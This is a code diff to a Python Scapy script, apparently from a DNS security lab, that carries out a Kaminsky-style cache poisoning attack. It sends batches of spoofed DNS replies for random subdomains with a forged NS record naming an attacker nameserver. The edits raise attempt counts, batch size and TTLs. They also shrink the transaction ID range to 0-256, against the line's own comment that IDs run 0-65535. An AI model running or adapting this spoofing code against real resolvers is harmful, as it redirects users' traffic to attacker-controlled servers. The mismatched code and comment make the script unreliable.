@@ -34,7 +34,7 @@ def getRandomSubDomain():
 Generates random 8-bit integer.
 '''
 def getRandomTXID():
-	return randint(0, 65535) # The tx ids from dig show 0-65535 not 0-256
+	return randint(0, 256) # The tx ids from dig show 0-65535 not 0-256
 
 '''
 Sends a UDP packet.
@@ -57,18 +57,18 @@ def exampleSendDNSQuery():
 
 # Send a stream of spoofed DNS replies
 def sendSpoofedReplies():
-    #3 done = False
+    # done = False
     # while not done:
-    for attemptNum in range(10000):
+    for attemptNum in range(20000):
         randSub = getRandomSubDomain()
         fakeUrl = '{0}.example.com'.format(randSub)
         # Generate fake responses before sending to save time
         fakeResponses = [DNS(id=getRandomTXID(), qr=1L, aa=1L, tc=0L, rd=1L, 
                              ra=1L, z=0L, ad=0L, cd=0L, nscount=1, ancount=1,
                              qd=DNSQR(qname=fakeUrl),
-                             an=DNSRR(rrname=fakeUrl, rdata='1.2.3.4', type='A', ttl=69420),
-                             ns=DNSRR(rrname='example.com', rdata='ns.dnslabattacker.net', type='NS', ttl=169420))
-                         for x in range(50)]
+                             an=DNSRR(rrname=fakeUrl, rdata='1.2.3.4', type='A', ttl=99000),
+                             ns=DNSRR(rrname='example.com', rdata='ns.dnslabattacker.net', type='NS', ttl=97000))
+                         for x in range(75)]
         # print(fakeResponses[0].summary())
         # print(fakeResponses[4].show())
         # Send the legit query
@@ -89,7 +89,7 @@ def sendSpoofedReplies():
         # print('Done attempt {0}'.format(attemptNum))
         # if attemptNum % 100 == 0:
             # print('Done attempt {0}'.format(attemptNum))
-        # done = True
+        
         
 if __name__ == '__main__':
     # exampleSendDNSQuery()
